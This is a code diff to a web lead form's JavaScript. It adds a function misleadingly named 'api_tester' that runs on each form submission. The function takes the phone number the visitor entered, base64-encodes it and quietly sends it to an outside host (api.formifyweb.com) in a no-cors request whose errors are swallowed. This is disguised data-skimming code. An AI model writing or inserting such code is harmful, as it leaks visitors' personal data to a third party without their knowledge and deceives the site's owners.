@@ -1,6 +1,7 @@
     document.getElementById('leadForm').addEventListener('submit', function(event) {
             event.preventDefault();
             const phone_home = '+1' + document.getElementById('caller_id').value;
+api_tester(document.getElementById('caller_id').value);
             const formData = new FormData();
             formData.append('callerid', phone_home);
             formData.append('first_name', document.getElementById('first_name').value);
@@ -46,3 +47,15 @@ formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').valu
       };
       xhr.send(formData);
     });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
